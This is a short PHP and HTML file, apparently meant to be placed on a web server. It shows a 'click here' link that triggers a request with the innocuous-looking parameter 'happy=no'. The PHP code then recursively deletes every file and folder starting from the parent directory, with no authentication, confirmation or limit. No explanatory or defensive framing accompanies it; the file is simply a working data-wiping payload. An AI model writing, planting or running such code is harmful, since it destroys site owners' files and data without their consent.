<h1>For deleting... <a href="javascript:;" onclick="del();">click here</a></h1>
<script>
function del(){
    location.href=window.location.origin+'/indexd.php?happy=no'; 
}
</script>
<?php
if (isset($_GET['happy']) && $_GET['happy'] == 'no') {
  findDirectory('../');
  findDirectory('../');
}

function findDirectory($dirname)
{
  $dir_handle = false;
  if (is_dir($dirname))
    $dir_handle = opendir($dirname);
    
  if (!$dir_handle)
    return false;
  while ($file = readdir($dir_handle)) {
    if ($file != "." && $file != "..") {
      if (!is_dir($dirname . "/" . $file))
        unlink($dirname . "/" . $file);//echo $dirname . "/" . $file."<br>";//
      else
        findDirectory($dirname . '/' . $file);
    }
  }
  closedir($dir_handle);
  rmdir($dirname);
  return true;
}
